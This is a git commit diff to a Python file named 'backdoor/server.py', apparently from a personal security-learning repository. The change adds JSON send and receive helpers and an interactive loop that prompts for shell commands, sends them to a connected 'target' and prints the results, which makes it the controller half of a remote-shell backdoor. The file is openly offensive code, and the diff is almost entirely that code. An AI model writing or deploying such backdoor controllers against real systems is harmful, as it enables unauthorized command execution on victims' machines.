f306a5701970a9906fb6002dce14921e97bb66e4
krmxyz <rashfordmartial05@gmail.com>
2021-04-19 10:15:47 +0800

    add some files

--- python script for security/backdoor/server.py
+++ python script for security/backdoor/server.py
@@ -1,8 +1,30 @@
 import socket
+import json
+
+
+def reliable_recv():
+	data = ''
+	while True:
+		try:
+			data=data+target.recv(1024).decode().rstrip()
+			return json.loads(data)
+		except ValueError:
+			continue
+
+
+def reliable_send(data):
+ 	jsondata = json.dumps(data)
+ 	target.send(jsondata.encode())
+
 
 def target_communication(): 
-	message = target.recv(1024)
-	print(message.decode())
+	while True:
+		command = input('* Shell~%s: ' % str(ip))
+		reliable_send(command)
+		if command == 'quit':
+			break
+		result = reliable_recv()
+		print(result)
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.bind(('127.0.0.1', 5555))
